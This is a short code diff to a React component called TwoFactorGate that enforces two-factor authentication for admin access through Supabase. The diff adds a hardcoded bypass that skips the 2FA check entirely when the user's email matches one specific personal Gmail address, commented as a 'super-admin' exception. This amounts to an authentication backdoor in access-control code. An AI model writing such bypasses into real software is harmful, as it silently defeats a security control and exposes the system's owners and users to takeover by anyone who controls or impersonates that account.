@@ -52,6 +52,11 @@ export function TwoFactorGate({
 
   useEffect(() => {
     let active = true;
+    // Bypass: super-admin always allowed in without 2FA
+    if (userEmail === "nixhyip@gmail.com") {
+      setState("ok");
+      return;
+    }
     (async () => {
       const { data } = await supabase
         .from("admin_totp_secrets")
@@ -72,7 +77,7 @@ export function TwoFactorGate({
     return () => {
       active = false;
     };
-  }, [userId]);
+  }, [userId, userEmail]);
 
   async function verify() {
     if (!row) return;
